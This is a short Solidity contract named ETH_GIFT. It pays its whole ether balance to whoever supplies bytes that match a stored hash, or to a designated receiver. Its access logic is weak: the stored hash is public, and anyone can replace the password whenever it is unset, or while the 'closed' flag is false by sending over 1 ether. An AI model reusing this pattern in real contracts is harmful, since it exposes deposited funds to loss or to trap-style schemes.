/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETH_GIFT at 0xEFBfc3f373c9cc5c0375403177d71Bcc387D3597
*/
pragma solidity ^0.4.19;

contract ETH_GIFT
{
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == keccak256(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function GetGift()
    public
    payable
    {
        if(msg.sender==reciver)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    bytes32 hashPass;
    
    bool closed = false;
    
    address sender;
    
    address reciver;
 
    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
        {
            hashPass = hash;
            sender = msg.sender;

        }
    }
   
    function SetReciver(address _reciver)
    public
    {
        if(msg.sender==sender)
        {
            reciver = _reciver;
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass&&msg.sender==sender)
        {
           closed=true;
        }
    }
    
    function() public payable{}
    
}